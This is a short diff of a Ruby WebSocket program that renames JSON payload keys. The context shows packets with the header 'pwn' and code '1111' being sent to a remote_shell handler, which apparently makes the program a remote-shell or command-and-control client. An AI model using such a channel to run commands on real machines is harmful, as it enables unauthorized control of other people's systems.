@@ -17,8 +17,8 @@ EM.run {
     begin
       packet = JSON.parse(event.data)
       if packet['header'] == "pwn" then
-        client = packet['payload']['client.id']
-        inator = packet['payload']['inator.code']
+        client = packet['payload']['client']
+        inator = packet['payload']['inator']
         data = packet['payload']['data']
         if inator == "1111" then
           remote_shell(ws, data)
@@ -45,8 +45,8 @@ EM.run {
       packet = {
         "header" => "data",
         "payload" => {
-          "client.id" => "10969",
-          "inator.code" => "1111",
+          "client" => "10969",
+          "inator" => "1111",
           "data" => "#{line}"
         },
         "trailer" => "#{line}"
@@ -66,8 +66,8 @@ EM.run {
       packet = {
         "header" => "data",
         "payload" => {
-          "client.id" => "10969",
-          "inator.code" => "2222",
+          "client" => "10969",
+          "inator" => "2222",
           "data" => "#{line}"
         },
         "trailer" => "#{line}"
